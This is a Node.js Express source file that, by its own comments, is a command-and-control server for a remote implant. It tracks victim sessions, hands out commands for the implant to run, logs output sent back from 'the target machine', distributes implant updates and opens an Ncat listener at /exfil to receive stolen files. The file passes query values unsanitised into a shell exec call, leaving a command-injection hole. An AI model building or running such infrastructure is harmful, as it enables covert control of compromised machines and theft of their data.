const express = require('express')
const fs = require('fs')
const hostname = 'localhost';
const port = 443;
var session = require('express-session');
const { exec } = require("child_process");

const app = express();

var command = "ipconfig";

app.use(session({
	secret: "keyboardCat",
	resave: false,
	saveUninitialized: true
}));

app.get('/', (req, res) => {
	sid = req.sessionID;
	console.log((`${sid} has connected`));
	fs.mkdirSync(`Sessions/${sid}`);
	fs.writeFile(`Sessions/${sid}/${sid}.log`, "Connection Established\n", err => {
  		if (err) console.error(err)
	})
	res.send(`${sid}`);
});

app.get('/reconnect', (req, res) => {
		var sid = req.query.sid;
		console.log(`${sid} has reconnected.`);
		fs.appendFile(`Sessions/${sid}/${sid}.log`, "Connection has been reestablished\n", err => {
				if (err) console.error(err)
		})
		res.send(`Welcome Back`);
});

//Used to return the output from the target machine to our C2 server
app.get('/info', (req, res) => {
    if(req.query.info != null){
		var sid = req.query.sid;
    var InfoText = req.query.info;
    console.log(`${sid}: ${InfoText}`)
		fs.appendFile(`Sessions/${sid}/${sid}.log`, `${InfoText}\n`, err => {
		  	if (err) console.error(err)
		})
    }
    res.send("Information Sent!")
});

//Used to send out command to the server to be read by the implant
app.get('/retrcommand', (req, res) => {
    res.send(command)
		console.log(`${sid} has been sent ${command}.`);
});

app.get('/updateImplant', (req, res) => {
		var sid = req.query.sid;
    res.download('Implant/implant.py')
		console.log(`${sid} has updated their implant.`);
		fs.appendFile(`Sessions/${sid}/${sid}.log`, `${sid} had downloaded a new implant.\n`, err => {
				if (err) console.error(err)
		})
});

app.get('/exfil', (req, res) => {
	async function OpenExfilPort () {
		var sid = req.query.sid;
		var fileName = req.query.file;
		await exec(`Ncat -lp 1234 > Sessions/${sid}/${fileName}`, (err, stdout, stderr) => {
    		if (err) console.error(err)
    		if (stderr) console.error(stderr)
    		console.log(`${sid} has transferred file: ${fileName}.`);
		});
	}
	OpenExfilPort()
	res.send()
});

app.listen(port, hostname);
